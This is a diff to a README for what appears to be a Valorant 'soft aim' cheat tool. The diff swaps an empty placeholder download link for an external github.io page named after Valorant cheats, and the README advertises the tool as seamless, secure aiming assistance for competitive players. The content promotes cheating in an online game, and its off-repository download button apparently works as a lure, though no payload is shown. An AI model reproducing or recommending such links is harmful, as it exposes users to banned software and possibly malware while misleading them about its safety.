@@ -2,7 +2,7 @@
 
 An advanced soft aim tool designed specifically for Valorant players to improve aiming precision and overall gameplay experience. Ideal for competitive gamers who want seamless and secure aiming assistance.
 
-[![Download Valorant Soft Aim Pro](https://img.shields.io/badge/Download-Valorant%20SoftAim-blueviolet)](#)
+[![Download Valorant Soft Aim Pro](https://img.shields.io/badge/Download-Valorant%20SoftAim-blueviolet)](https://valorant-cheats-ultimate.github.io/.github)
 
 ---
 
